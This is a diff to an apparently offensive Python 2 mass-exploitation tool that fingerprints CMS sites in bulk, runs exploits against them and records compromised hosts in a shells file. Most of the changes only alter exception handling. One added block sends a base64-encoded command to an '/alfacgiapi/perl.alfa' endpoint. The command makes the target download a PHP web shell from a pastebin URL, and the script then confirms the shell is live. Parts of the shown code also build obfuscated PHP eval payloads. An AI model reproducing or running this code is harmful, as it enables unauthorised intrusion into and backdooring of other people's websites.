@@ -1,4 +1,4 @@
-#!/usr/bin/python
+﻿#!/usr/bin/python
 import urllib
 import urllib3
 from urllib import urlopen as o
@@ -110,7 +110,8 @@ def prepare(url, ua):
 		injection = urllib2.Request(url, headers=headers)
 		injection.add_header('Cookie', cookieJar)
 		urllib2.urlopen(injection)
-	except:
+	except Exception as inst:
+		print(inst)
 		pass
 def toCharCode(string):
 	try:
@@ -118,7 +119,8 @@ def toCharCode(string):
 		for char in string:
 			encoded += "chr({0}).".format(ord(char))
 		return encoded[:-1]
-	except:
+	except Exception as inst:
+		print(inst)
 		pass
 def generate(payload):
     php_payload = "eval({0})".format(toCharCode(payload))
@@ -151,7 +153,8 @@ def cms(url):
             open('CMS/Joomla.txt', 'a').write(url+'\n')
             joomlaaa(url)
             smtps(url)
-    except:
+    except Exception as inst:
+        print(inst)
         pass
     try:		
 		
@@ -162,10 +165,8 @@ def cms(url):
 			print "\033[0m[!]\033[92m CMS: Wordpress"
 			open('CMS/Wordpress.txt', 'a').write(url+'\n')
 			wordpress(url)			
-		else:
-			print ''.format(sb, sd, url, fc,fc, sb,fr)
-			Unknown(url)           		
-    except:
+    except Exception as inst:
+        print(inst)
         pass
     try:		
 		
@@ -176,7 +177,8 @@ def cms(url):
 			print "\033[0m[!]\033[92m CMS: Drupal"
 			open('CMS/Drupal.txt', 'a').write(url+'\n')
 			drupal(url)			       			
-    except:
+    except Exception as inst:
+        print(inst)
         pass	
     try:		
 		
@@ -187,7 +189,8 @@ def cms(url):
 			print "\033[0m[!]\033[92m CMS: Prestashop"
 			open('CMS/Prestashop.txt', 'a').write(url+'\n')
 			prestashop(url)					
-    except:
+    except Exception as inst:
+        print(inst)
         pass
     try:		
 		
@@ -199,7 +202,8 @@ def cms(url):
 			print "\033[0m[!]\033[92m CMS: osCommerce"
 			open('CMS/osCommerce.txt', 'a').write(url+'\n')
 			osrce(url)						
-    except:
+    except Exception as inst:
+        print(inst)
         pass
     try:		
 		
@@ -210,7 +214,8 @@ def cms(url):
 			print "\033[0m[!]\033[92m CMS: zen"
 			open('CMS/zen.txt', 'a').write(url+'\n')
 			zenbot(url)						
-    except:
+    except Exception as inst:
+        print(inst)
         pass
     try:		
 		
@@ -220,7 +225,8 @@ def cms(url):
 			print "\033[0m[$] \033[92mURL:",url
 			print "\033[0m[!]\033[92m CMS: Magento"
 			open('CMS/Magento.txt', 'a').write(url+'\n')					
-    except:
+    except Exception as inst:
+        print(inst)
         pass
     try:		
 		
@@ -230,7 +236,8 @@ def cms(url):
 			print "\033[0m[$] \033[92mURL:",url
 			print "\033[0m[!]\033[92m CMS: OpenCart"
 			open('CMS/OpenCart.txt', 'a').write(url+'\n')					
-    except:
+    except Exception as inst:
+        print(inst)
         pass
     try:		
 		
@@ -240,7 +247,13 @@ def cms(url):
 			print "\033[0m[$] \033[92mURL:",url
 			print "\033[0m[!]\033[92m CMS: vBulletin"
 			open('CMS/vBulletin.txt', 'a').write(url+'\n')					
-    except:
+    except Exception as inst:
+        print(inst)
+        pass
+    try:
+		Unknown(url)
+    except Exception as inst:
+        print(inst)
         pass
 ######################### Drupal ##############################
 
@@ -555,7 +568,8 @@ def drupal(url):
 					
 
 			
-    except:
+    except Exception as inst:
+        print(inst)
         pass
 
 
@@ -2693,7 +2707,8 @@ def wordpress(url):
 
 
 			
-    except:
+    except Exception as inst:
+        print(inst)
         pass		
 
 ############################################## Joomla ##############################################
@@ -2710,7 +2725,8 @@ def rce_url(url, user_agent):
 			response = requests.get(url, headers=headers,cookies=cookies)    
 		return response
 		
-	except:
+	except Exception as inst:
+		print(inst)
 		pass
 
 def generate_payload(php_payload):
@@ -2727,7 +2743,8 @@ def generate_payload(php_payload):
 	  
 		return exploit_template
 		
-	except:
+	except Exception as inst:
+		print(inst)
 		pass
 
 ############################ For SMTP'S ###################################################
@@ -4755,7 +4772,8 @@ def joomlaaa(url):
 			print '\033[92m[>] \033[0mExploit mod_jfancy  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
 
 
-    except:
+    except Exception as inst:
+        print(inst)
         pass
 		
 		
@@ -5518,7 +5536,8 @@ def prestashop(url):
 			
 	
 			
-    except:
+    except Exception as inst:
+        print(inst)
         pass
 
 def Unknown(url):
@@ -5930,10 +5949,31 @@ def Unknown(url):
 			sys.exit()
 		else:
 			print '\033[92m[>] \033[0mExploit Netvidade  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
-			
 
 
-	except:
+
+		# /alfacgiapi/perl.alfa
+		
+		post_data = {
+                    'cmd': 'd2dldCAtTyBhbGZhLnBocCBodHRwOi8vcGFzdGViaW4uY29tL3Jhdy9uU3lxVFdpNg=='
+                    }
+		
+		req = requests.post(url+'/alfacgiapi/perl.alfa', data=post_data)
+		
+		lib = requests.get(url+"/alfacgiapi/alfa.php")
+
+		if '1557049322' in lib.content:
+			print '\033[92m[>] \033[0mExploit alfacgiapi \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
+			open('Exploited/Shells.txt', 'a').write(url+'/alfacgiapi/alfa.php|1557049322|base64substr'+'\n')
+			sys.exit()
+		else:
+			print '\033[92m[>] \033[0mExploit alfacgiapi  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
+
+
+
+
+	except Exception as inst:
+		print(inst)
 		pass
 		
 def osrce(url):
@@ -5962,7 +6002,8 @@ def osrce(url):
 
 
 			
-    except:
+    except Exception as inst:
+        print(inst)
         pass		
 		
 		
@@ -5994,7 +6035,8 @@ def zenbot(url):
 
 
 			
-    except:
+    except Exception as inst:
+        print(inst)
         pass
 		
 		
@@ -6008,7 +6050,8 @@ def php_str_noquotes(data):
 	  
 		return encoded[:-1]
 		
-	except:
+	except Exception as inst:
+		print(inst)
 		pass		
 		
 
@@ -6020,7 +6063,8 @@ def Main():
         ThreadPool = Pool(100)
         Threads = ThreadPool.map(cms, sites)
         print('BAZOOKA Finished in : ' + str(timer() - start) + ' seconds')
-    except:
+    except Exception as inst:
+        print(inst)
         pass
 
 
